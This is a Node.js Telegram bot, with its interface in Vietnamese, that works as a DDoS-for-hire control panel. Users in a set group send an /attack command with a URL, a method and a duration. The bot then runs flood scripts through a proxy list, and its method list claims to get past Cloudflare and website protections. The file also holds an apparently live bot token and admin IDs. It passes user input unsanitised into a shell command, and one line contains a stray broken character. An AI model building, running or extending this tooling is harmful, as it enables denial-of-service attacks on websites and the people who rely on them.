const TelegramBot = require('node-telegram-bot-api');
const Database = require('better-sqlite3');
const token = '7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc';
const bot = new TelegramBot(token, { polling: true });
const admins = [6601930239, 1848131455];
const groupId = -1002370415846;
const methods = ['tls', 'flood', 'reflood', 'kill', 'bypass'];
const db = Database('bot.db');
db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
CREATE TABLE IF NOT EXISTS slots (userId INTEGER, url TEXT, method TEXT, endTime INTEGER, PRIMARY KEY(userId, url, method));`);
const getSetting = db.prepare('SELECT value FROM settings WHERE key=?');
const setSetting = db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
const getAllBlacklist = db.prepare('SELECT keyword FROM blacklist');
const addBlacklist = db.prepare('INSERT OR IGNORE INTO blacklist (keyword) VALUES (?)');
const removeBlacklist = db.prepare('DELETE FROM blacklist WHERE keyword=?');
const getAllSlots = db.prepare('SELECT * FROM slots');
const addSlot = db.prepare('INSERT INTO slots (userId, url, method, endTime) VALUES (?, ?, ?, ?)');
const removeSlot = db.prepare('DELETE FROM slots WHERE userId=? AND url=? AND method=?');
const removeExpiredSlots = db.prepare('DELETE FROM slots WHERE endTime <= ?');
if (!getSetting.get('maintenance')) setSetting.run('maintenance', 'false');
if (!getSetting.get('activeSlots')) setSetting.run('activeSlots', '0');
setSetting.run('activeSlots', '0');
let maintenance = getSetting.get('maintenance').value === 'true';
let blacklist = getAllBlacklist.all().map(r => r.keyword);
let activeSlots = parseInt(getSetting.get('activeSlots').value);
const maxSlots = 2;
let lastAttackTime = 0;
const cooldown = 30000;

function syncSlotsFromDb() {
  removeExpiredSlots.run(Math.floor(Date.now() / 1000));
  activeSlots = getAllSlots.all().length;
  setSetting.run('activeSlots', activeSlots.toString());
}
syncSlotsFromDb();

bot.onText(/\/スタート/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  bot.sendMessage(chatId, `*📜 Lệnh của Bot:*\n• /methods -> Xem danh sách methods\n• /attack [url] [method] [time]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Bật hoặc tắt chức năng bảo trì Bot (admin only)\n• /ongoing -> Xem slot đang hoạt động`, { parse_mode: "Markdown" });
});

bot.onText(/\/methods/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• reflood -> Bản v2, nhiều ip nhưng yếu hơn v1\n• kill -> Mạnh nhưng no bypass\n• bypass -> Bypass website`, { parse_mode: "Markdown" });
});

bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
  const chatId = msg.chat.id构
  const userId = msg.from.id;
  if (!admins.includes(userId)) return bot.sendMessage(chatId, 'Bạn không có quyền sử dụng lệnh này.');
  const bl = getAllBlacklist.all().map(r => r.keyword);
  bot.sendMessage(chatId, `📝 Blacklist hiện tại:\n${bl.length ? bl.map(k=>`- \`${k}\``).join('\n') : 'Không có keyword nào.'}`, { parse_mode: "Markdown" });
});

bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!admins.includes(userId)) return bot.sendMessage(chatId, 'Bạn không có quyền sử dụng lệnh này.');
  const action = match[1];
  const keyword = match[2].trim();
  if (action === 'add') {
    if (!blacklist.includes(keyword)) {
      blacklist.push(keyword);
      addBlacklist.run(keyword);
      bot.sendMessage(chatId, `✅ Đã thêm \`${keyword}\` vào blacklist`, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, `Từ khóa \`${keyword}\` đã có trong blacklist.`, { parse_mode: "Markdown" });
    }
  } else if (action === 'remove') {
    if (blacklist.includes(keyword)) {
      blacklist = blacklist.filter(k => k !== keyword);
      removeBlacklist.run(keyword);
      bot.sendMessage(chatId, `🚫 Đã xoá \`${keyword}\` khỏi blacklist`, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, `Từ khóa \`${keyword}\` không có trong blacklist.`, { parse_mode: "Markdown" });
    }
  }
});

bot.onText(/\/maintenance/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!admins.includes(userId)) return bot.sendMessage(chatId, 'Bạn không có quyền sử dụng lệnh này.');
  maintenance = !maintenance;
  setSetting.run('maintenance', maintenance ? 'true' : 'false');
  bot.sendMessage(chatId, `🛠️ Bảo trì: *${maintenance ? 'Bật' : 'Tắt'}*`, { parse_mode: "Markdown" });
});

bot.onText(/\/ongoing/, (msg) => {
  syncSlotsFromDb();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  const now = Math.floor(Date.now()/1000);
  const slots = getAllSlots.all();
  if (!slots.length) {
    bot.sendMessage(chatId, `Hiện không có slot nào đang hoạt động.\nSố slot trống: ${maxSlots}/${maxSlots}`, { parse_mode: "Markdown" });
    return;
  }
  let text = `*Ongoing Attacks:*\n`;
  slots.forEach((s, i) => {
    let timeLeft = s.endTime - now;
    timeLeft = timeLeft > 0 ? timeLeft : 0;
    text += `\n${i+1}. 👤 User: \`${s.userId}\`\n   🔗 URL: \`${s.url}\`\n   ⚙️ Method: \`${s.method}\`\n   ⏳ Còn lại: \`${timeLeft}s\``;
  });
  text += `\n\nSlot trống: ${maxSlots-slots.length}/${maxSlots}`;
  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

bot.onText(/\/attack$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  bot.sendMessage(chatId, 'Cú pháp: /attack [url] [method] [time]\nVD: /attack https://abc.com tls 30', { parse_mode: "Markdown" });
});

bot.onText(/\/attack (.+) (tls|flood|reflood|kill|bypass) (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  if (maintenance && !admins.includes(userId)) {
    bot.sendMessage(chatId, '🛠️ Bot đang bảo trì, vui lòng thử lại sau.', { parse_mode: "Markdown" });
    return;
  }
  const url = match[1];
  const method = match[2];
  let time = parseInt(match[3]);
  if (!methods.includes(method)) {
    bot.sendMessage(chatId, '🚫 Method không hợp lệ.', { parse_mode: "Markdown" });
    return;
  }
  if (blacklist.some(k => url.includes(k))) {
    bot.sendMessage(chatId, '🚫 URL này nằm trong blacklist.', { parse_mode: "Markdown" });
    return;
  }
  if (!admins.includes(userId) && time > 60) {
    time = 60;
  }
  syncSlotsFromDb();
  if (activeSlots >= maxSlots) {
    bot.sendMessage(chatId, '🚫 Hiện không còn slot trống, vui lòng thử lại sau.', { parse_mode: "Markdown" });
    return;
  }
  const now = Date.now();
  if (now - lastAttackTime < cooldown) {
    const waitTime = Math.ceil((cooldown - (now - lastAttackTime)) / 1000);
    bot.sendMessage(chatId, `⏳ Vui lòng đợi ${waitTime}s trước khi gửi attack tiếp theo.`, { parse_mode: "Markdown" });
    return;
  }
  const endTime = Math.floor(now / 1000) + time;
  addSlot.run(userId, url, method, endTime);
  activeSlots++;
  setSetting.run('activeSlots', activeSlots.toString());
  lastAttackTime = now;
  bot.sendMessage(chatId, `*🔫 Attack sent!*\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\``, { parse_mode: "Markdown" });
  const { exec } = require('child_process');
  exec(`node ${method}.js ${url} ${time} 64 8 proxy.txt`, (error, stdout, stderr) => {
    removeSlot.run(userId, url, method);
    syncSlotsFromDb();
    bot.sendMessage(
      groupId,
      `Đã có slot mới. ✅\nSố slot hiện tại: ${activeSlots}/${maxSlots}. 🔢`,
      { parse_mode: "Markdown" }
    );
    if (error) {
      bot.sendMessage(chatId, `🚫 Lỗi: \`${error.message}\``, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, `✅ Hoàn thành!\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: "Markdown" });
    }
  });
});

function isAllowed(chatId, userId) {
  if (admins.includes(userId)) return true;
  if (chatId !== groupId) return false;
  return true;
}
